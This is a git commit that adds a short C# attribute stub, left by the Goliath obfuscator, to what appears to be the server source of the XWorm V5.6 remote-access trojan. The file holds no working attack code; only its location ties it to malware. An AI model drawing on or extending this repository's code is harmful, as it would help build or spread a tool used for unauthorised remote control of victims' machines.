e46cfab2b1d5bbdf82078f8ab83a033d69f43f22
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:52:58 +0400

    ObfuscatedByGoliath.cs

---
+++ XWorm V5.6/Server/Obfuscator/ObfuscatedByGoliath.cs
@@ -0,0 +1,9 @@
+﻿using System;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+internal class ObfuscatedByGoliath : Attribute
+{
+  [MethodImpl(MethodImplOptions.NoInlining)]
+  public ObfuscatedByGoliath([In] string obj0) => throw new Exception("や");
+}
